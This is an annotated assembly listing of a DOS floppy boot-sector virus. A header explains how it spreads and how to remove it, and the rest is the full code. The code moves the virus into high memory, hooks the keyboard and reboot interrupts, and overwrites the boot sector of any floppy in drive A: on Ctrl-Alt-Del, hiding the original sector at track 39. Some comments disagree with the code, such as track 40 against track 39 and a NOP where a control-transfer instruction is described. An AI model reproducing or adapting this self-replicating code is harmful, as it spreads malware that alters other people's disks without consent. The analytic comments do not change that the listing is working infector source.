;-----------------------------------------------------------------------;
; This virus is of the "FLOPPY ONLY" variety.                           ;
; It replicates to the boot sector of a floppy disk and when it gains control  
; it will move itself to upper memory.  It redirects the keyboard       ;
; interrupt (INT 09H) to look for ALT-CTRL-DEL sequences at which time  ;
; it will attempt to infect any floppy it finds in drive A:.            ;
; It keeps the real boot sector at track 39, sector 8, head 0           ;
; It does not map this sector bad in the fat (unlike the Pakistani Brain)
; and should that area be used by a file, the virus                     ;
; will die.  It also contains no anti detection mechanisms as does the  ;
; BRAIN virus.  It apparently uses head 0, sector 8 and not head 1      ;
; sector 9 because this is common to all floppy formats both single     ;
; sided and double sided.  It does not contain any malevolent TROJAN    ; 
; HORSE code.  It does appear to contain a count of how many times it   ;
; has infected other diskettes although this is harmless and the count  ;
; is never accessed.                                                    ;
;                                                                       ;
; Things to note about this virus:                                      ;
; It can not only live through an ALT-CTRL-DEL reboot command, but this ;
; is its primary (only for that matter) means of reproduction to other  ;
; floppy diskettes.  The only way to remove it from an infected system  ;
; is to turn the machine off and reboot an uninfected copy of DOS.      ;
; It is even resident when no floppy is booted but BASIC is loaded      ;
; instead.  Then when ALT-CTRL-DEL is pressed from inside of BASIC,     ;
; it activates and infectes the floppy from which the user is           ;
; attempting to boot.                                                   ;
;                                                                       ;
; Also note that because of the POP CS command to pass control to       ;
; its self in upper memory, this virus does not to work on 80286        ;
; machines (because this is not a valid 80286 instruction).             ;
;                                                                       ;
; The Norton Utilities can be used to identify infected diskettes by    ;
; looking at the boot sector and the DOS SYS utility can be used to     ;
; remove it (unlike the Pakistani Brain).                               ;
;-----------------------------------------------------------------------;
                        ;
    ORG  7C00H               ;
                        ;
TOS LABEL     WORD           ;TOP OF STACK
;-----------------------------------------------------------------------;
; 1. Find top of memory and copy ourself up there. (keeping same offset);
; 2. Save a copy of the first 32 interrupt vectors to top of memory too ;
; 3. Redirect int 9 (keyboard) to ourself in top of memory              ;
; 4. Jump to ourself at top of memory                                   ;
; 5. Load and execute REAL boot sector from track 40, head 0, sector 8  ;
;-----------------------------------------------------------------------;
BEGIN:   CLI                 ;INITIALIZE STACK
    XOR  AX,AX               ;
    MOV  SS,AX               ;
    MOV  SP,offset TOS       ;
    STI                 ;
                        ;
    MOV  BX,0040H       ;ES = TOP OF MEMORY - (7C00H+512)
    MOV  DS,BX               ;
    MOV  AX,[0013H]          ;
    MUL  BX             ;
    SUB  AX,07E0H       ;   (7C00H+512)/16
    MOV  ES,AX               ;
                        ;
    PUSH CS             ;DS = CS
    POP  DS             ;
                        ;
    CMP  DI,3456H       ;IF THE VIRUS IS REBOOTING...
    JNE  B_10           ;
    DEC  Word Ptr [COUNTER_1]     ;...LOW&HI:COUNTER_1--
                        ;
B_10:    MOV  SI,SP     ;SP=7C00  ;COPY SELF TO TOP OF MEMORY
    MOV  DI,SI               ;
    MOV  CX,512              ;
    CLD                 ;
    REP  MOVSB               ;
                        ;
    MOV  SI,CX     ;CX=0          ;SAVE FIRST 32 INT VETOR ADDRESSES TO
    MOV  DI,offset BEGIN - 128    ;   128 BYTES BELOW OUR HI CODE
    MOV  CX,128              ;
    REP  MOVSB               ;
                        ;
    CALL PUT_NEW_09          ;SAVE/REDIRECT INT 9 (KEYBOARD)
                        ;
    PUSH ES   ;ES=HI    ;   JUMP TO OUR HI CODE WITH
    NOP
                        ;
    PUSH DS   ;DS=0     ;   ES = DS
    POP  ES             ;
                        ;
    MOV  BX,SP          ;   SP=7C00  ;LOAD REAL BOOT SECTOR TO 0000:7C00
    MOV  DX,CX          ;CX=0        ;DRIVE A: HEAD 0
    MOV  CX,2708H       ;   TRACK 40, SECTOR 8
    MOV  AX,0201H       ;   READ SECTOR
    INT  13H            ;   (common to 8/9 sect. 1/2 sided!)
    JB   $              ;   HANG IF ERROR
                        ;
    JMP  JMP_BOOT       ;JMP 0000:7C00
                        ;
;-----------------------------------------------------------------------;
; SAVE THEN REDIRECT INT 9 VECTOR                                       ;
;                                                                       ;
; ON ENTRY:   DS = 0                                                    ;
;        ES = WHERE TO SAVE OLD_09 & (HI)                               ;
;             WHERE NEW_09 IS         (HI)                              ;
;-----------------------------------------------------------------------;
PUT_NEW_09:                  ;
    DEC  Word Ptr [0413H]    ;TOP OF MEMORY (0040:0013) -= 1024
                        ;
    MOV  SI,9*4              ;COPY INT 9 VECTOR TO
    MOV  DI,offset OLD_09    ;   OLD_09 (IN OUR HI CODE!)
    MOV  CX,0004             ;
                        ;
    CLI                 ;
    REP  MOVSB               ;
    MOV  Word Ptr [9*4],offset NEW_09
    MOV  [(9*4)+2],ES        ;
    STI                 ;
                        ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
; RESET KEYBOARD, TO ACKNOWLEDGE LAST CHAR                              ;
;-----------------------------------------------------------------------;
ACK_KEYBD:                   ;
    IN   AL,61H              ;RESET KEYBOARD THEN CONTINUE
    MOV  AH,AL               ;
    OR   AL,80H              ;
    OUT  61H,AL              ;
    XCHG AL,AH               ;
    OUT  61H,AL              ;
    JMP  RBOOT               ;
                        ;
;-----------------------------------------------------------------------;
; DATA AREA WHICH IS NOT USED IN THIS VERSION                           ;
; REASON UNKNOWN                                                        ;
;-----------------------------------------------------------------------;
TABLE    DB   27H,0,1,2      ;FORMAT INFORMATION FOR TRACK 39
    DB   27H,0,2,2      ;   (CURRENTLY NOT USED)
    DB   27H,0,3,2      ;
    DB   27H,0,4,2      ;
    DB   27H,0,5,2      ;
    DB   27H,0,6,2      ;
    DB   27H,0,7,2      ;
    DB   27H,0,8,2      ;
                        ;
;A7C9A   LABEL     BYTE           ;
    DW   00024H              ;NOT USED
    DB   0ADH           ;
    DB   07CH           ;
    DB   0A3H           ;
    DW   00026H              ;
                        ;
;L7CA1:                      ;
    POP  CX             ;NOT USED
    POP  DI             ;
    POP  SI             ;
    POP  ES             ;
    POP  DS             ;
    POP  AX             ;
    POPF                ;
    JMP  1111:1111      ;
                        ;
;-----------------------------------------------------------------------;
; IF ALT & CTRL & DEL THEN ...                                          ;
; IF ALT & CTRL & ? THEN ...                                            ;
;-----------------------------------------------------------------------;
NEW_09:  PUSHF                    ;
    STI                 ;
                        ;
    PUSH AX             ;
    PUSH BX             ;
    PUSH DS             ;
                        ;
    PUSH CS             ;DS=CS
    POP  DS             ;
                        ;
    MOV  BX,[ALT_CTRL W]     ;BX=SCAN CODE LAST TIME
    IN   AL,60H              ;GET SCAN CODE
    MOV  AH,AL               ;SAVE IN AH
    AND  AX,887FH       ;STRIP 8th BIT IN AL, KEEP 8th BIT AH
                        ;
    CMP  AL,1DH              ;IS IT A [CTRL]...
    JNE  N09_10              ;...JUMP IF NO
    MOV  BL,AH               ;(BL=08 ON KEY DOWN, BL=88 ON KEY UP)
    JMP  N09_30              ;
                        ;
N09_10:  CMP  AL,38H              ;IS IT AN [ALT]...
    JNE  N09_20              ;...JUMP IF NO
    MOV  BH,AH               ;(BH=08 ON KEY DOWN, BH=88 ON KEY UP)
    JMP  N09_30              ;
                        ;
N09_20:  CMP  BX,0808H       ;IF (CTRL DOWN & ALT DOWN)...
    JNE  N09_30              ;...JUMP IF NO
                        ;
    CMP  AL,17H              ;IF [I]...
    JE   N09_X0              ;...JUMP IF YES
    CMP  AL,53H              ;IF [DEL]...
    JE   ACK_KEYBD      ;...JUMP IF YES
                        ;
N09_30:  MOV  [ALT_CTRL],BX       ;SAVE SCAN CODE FOR NEXT TIME
                        ;
N09_90:  POP  DS             ;
    POP  BX             ;
    POP  AX             ;
    POPF                ;
                        ;
    DB   0EAH           ;JMP F000:E987
OLD_09   DW   ?              ;
    DW   0F000H              ;
                        ;
N09_X0:  JMP  N09_X1              ;
                        ;
;-----------------------------------------------------------------------;
;                                                                       ;
;-----------------------------------------------------------------------;
RBOOT:   MOV  DX,03D8H       ;DISABLE COLOR VIDEO !?!?
    MOV  AX,0800H       ;AL=0, AH=DELAY ARG
    OUT  DX,AL               ;
    CALL DELAY               ;
    MOV  [ALT_CTRL],AX  ;AX=0     ;
                        ;
    MOV  AL,3 ;AH=0          ;SELECT 80x25 COLOR
    INT  10H            ;
    MOV  AH,2           ;SET CURSOR POS 0,0
    XOR  DX,DX               ;
    MOV  BH,DH               ;   PAGE 0
    INT  10H            ;
                        ;
    MOV  AH,1           ;SET CURSOR TYPE
    MOV  CX,0607H       ;
    INT  10H            ;
                        ;
    MOV  AX,0420H       ;DELAY (AL=20H FOR EOI BELOW)
    CALL DELAY               ;
                        ;
    CLI                 ;
    OUT  20H,AL              ;SEND EOI TO INT CONTROLLER
                        ;
    MOV  ES,CX     ;CX=0 (DELAY)  ;RESTORE FIRST 32 INT VECTORS
    MOV  DI,CX               ;   (REMOVING OUR INT 09 HANDLER!)
    MOV  SI,offset BEGIN - 128    ;
    MOV  CX,128              ;
    CLD                 ;
    REP  MOVSB               ;
                        ;
    MOV  DS,CX     ;CX=0          ;DS=0
                        ;
    MOV  Word Ptr [19H*4],offset NEW_19 ;SET INT 19 VECTOR
    MOV  [(19H*4)+2],CS      ;
                        ;
    MOV  AX,0040H       ;DS = ROM DATA AREA
    MOV  DS,AX               ;
                        ;
    MOV  [0017H],AH     ;AH=0     ;KBFLAG (SHIFT STATES) = 0
    INC  Word Ptr [0013H]    ;MEMORY SIZE += 1024 (WERE NOT ACTIVE)
                        ;
    PUSH DS             ;IF BIOS F000:E502 == 21E4...
    MOV  AX,0F000H      ;
    MOV  DS,AX               ;
    CMP  Word Ptr [0E502H],21E4H  ;
    POP  DS             ;
    JE   R_90           ;
    INT  19H            ;   IF NOT...REBOOT
                        ;
R_90:    JMP  0F000:0E502H        ;...DO IT ?!?!?!
                        ;
;-----------------------------------------------------------------------;
; REBOOT INT VECTOR                                                     ;
;-----------------------------------------------------------------------;
NEW_19:  XOR  AX,AX               ;
                        ;
    MOV  DS,AX               ;DS=0
    MOV  AX,[0410]      ;AX=EQUIP FLAG
    TEST AL,1           ;IF FLOPPY DRIVES ...
    JNZ  N19_20              ;...JUMP
N19_10:  PUSH CS             ;ELSE ES=CS
    POP  ES             ;
    CALL PUT_NEW_09          ;SAVE/REDIRECT INT 9 (KEYBOARD)
    INT  18H            ;LOAD BASIC
                        ;
N19_20:  MOV  CX,0004             ;RETRY COUNT = 4
                        ;
N19_22:  PUSH CX             ;
    MOV  AH,00               ;RESET DISK
    INT  13             ;
    JB   N19_81              ;
    MOV  AX,0201             ;READ BOOT SECTOR
    PUSH DS             ;
    POP  ES             ;
    MOV  BX,offset BEGIN          ;
    MOV  CX,1           ;TRACK 0, SECTOR 1
    INT  13H            ;
N19_81:  POP  CX             ;
    JNB  N19_90              ;
    LOOP N19_22              ;
    JMP  N19_10              ;IF RETRY EXPIRED...LOAD BASIC
                        ;
;-----------------------------------------------------------------------;
; Reinfection segment.                                                  ;
;-----------------------------------------------------------------------;
N19_90:  CMP  DI,3456             ;IF NOT FLAG SET...
    JNZ  RE_INFECT      ;...RE INFECT
                        ;
JMP_BOOT:                    ;PASS CONTROL TO BOOT SECTOR
    JMP  0000:7C00H          ;
                        ;
;-----------------------------------------------------------------------;
; Reinfection Segment.                                                  ;
;-----------------------------------------------------------------------;
RE_INFECT:                   ;
    MOV  SI,offset BEGIN          ;COMPARE BOOT SECTOR JUST LOADED WITH
    MOV  CX,00E6H       ;   OURSELF
    MOV  DI,SI               ;
    PUSH CS             ;
    POP  ES             ;
    CLD                 ;
    REPE CMPSB               ;
    JE   RI_12               ;IF NOT EQUAL...
                        ;
    INC  Word Ptr ES:[COUNTER_1]  ;INC. COUNTER IN OUR CODE (NOT DS!)
                        ;
;MAKE SURE TRACK 39, HEAD 0 FORMATTED  ;
    MOV  BX,offset TABLE          ;FORMAT INFO
    MOV  DX,0000             ;DRIVE A: HEAD 0
    MOV  CH,40-1             ;TRACK 39
    MOV  AH,5           ;FORMAT
    JMP  RI_10               ;REMOVE THE FORMAT OPTION FOR NOW !
                        ;
; <<< NO EXECUTION PATH TO HERE >>>    ;
    JB   RI_80               ;
                        ;
;WRITE REAL BOOT SECTOR AT TRACK 39, SECTOR 8, HEAD 0
RI_10:   MOV  ES,DX               ;ES:BX = 0000:7C00, HEAD=0
    MOV  BX,offset BEGIN          ;TRACK 40H
    MOV  CL,8           ;SECTOR 8
    MOV  AX,0301H       ;WRITE 1 SECTOR
    INT  13H            ;
                        ;
    PUSH CS             ;   (ES=CS FOR PUT_NEW_09 BELOW)
    POP  ES             ;
    JB   RI_80               ;IF WRITE ERROR...JUMP TO BOOT CODE
                        ;
    MOV  CX,0001             ;WRITE INFECTED BOOT SECTOR !
    MOV  AX,0301             ;
    INT  13H            ;
    JB   RI_80               ;   IF ERROR...JUMP TO BOOT CODE
                        ;
RI_12:   MOV  DI,3456H       ;SET "JUST INFECTED ANOTHER ONE"...
    INT  19H            ;...FLAG AND REBOOT
                        ;
RI_80:   CALL PUT_NEW_09          ;SAVE/REDIRECT INT 9 (KEYBOARD)
    DEC  Word Ptr ES:[COUNTER_1]  ;   (DEC. CAUSE DIDNT INFECT)
    JMP  JMP_BOOT       ;
                        ;
;-----------------------------------------------------------------------;
;                                                                       ;
;-----------------------------------------------------------------------;
N09_X1:  MOV  [ALT_CTRL],BX       ;SAVE ALT & CTRL STATUS
                        ;
    MOV  AX,[COUNTER_1]      ;PUT COUNTER_1 INTO RESET FLAG
    MOV  BX,0040H       ;
    MOV  DS,BX               ;
    MOV  [0072H],AX          ;   0040:0072 = RESET FLAG
    JMP  N09_90              ;
                        ;
;-----------------------------------------------------------------------;
; DELAY                                                                 ;
;                                                                       ;
; ON ENTRY    AH:CX = LOOP COUNT                                        ;
;-----------------------------------------------------------------------;
DELAY:   SUB  CX,CX               ;
D_01:    LOOP $              ;
    SUB  AH,1           ;
    JNZ  D_01           ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                                                       ;
;-----------------------------------------------------------------------;
A7DF4         DB   27H,00H,8,2

COUNTER_1     DW   001CH
ALT_CTRL      DW   0
A7DFC         DB   27H,0,8,2
